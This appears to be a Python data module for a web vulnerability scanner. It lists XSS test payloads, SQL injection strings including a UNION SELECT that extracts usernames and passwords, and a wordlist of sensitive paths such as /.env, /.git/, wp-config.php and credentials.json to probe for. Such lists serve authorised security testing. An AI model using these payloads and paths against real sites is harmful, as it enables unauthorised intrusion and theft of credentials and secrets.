XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT null, null, username, password FROM users --",
    "' OR 'a'='a",
    "' OR 'x'='x' --"
]

SENSITIVE_FILES = [
    "/.git/",
    "/.env",
    "/config.php",
    "/wp-config.php",
    "/database.yml",
    "/admin/",
    "/backup/",
     "/logs/",
    "/.htaccess",
    "/.htpasswd",
    "/phpinfo.php",
    "/.DS_Store",
    "/web.config",
    "/credentials.json",
    "/secrets.json",
    "/docker-compose.yml",
    "/.idea/",
    "/.vscode/",
    "/node_modules/",
    "/vendor/",
    "/composer.lock",
    "/package-lock.json",
     "/cgi-bin/",
    "/tmp/",
    "/uploads/",
    "/private/",
     "/info.php",                 
    "/old/",                     
    "/test/",                    
    "/install.php",
    "/setup.php",
    "/database.sql",
    "/db_backup.sql",
    "/robots.txt"

]

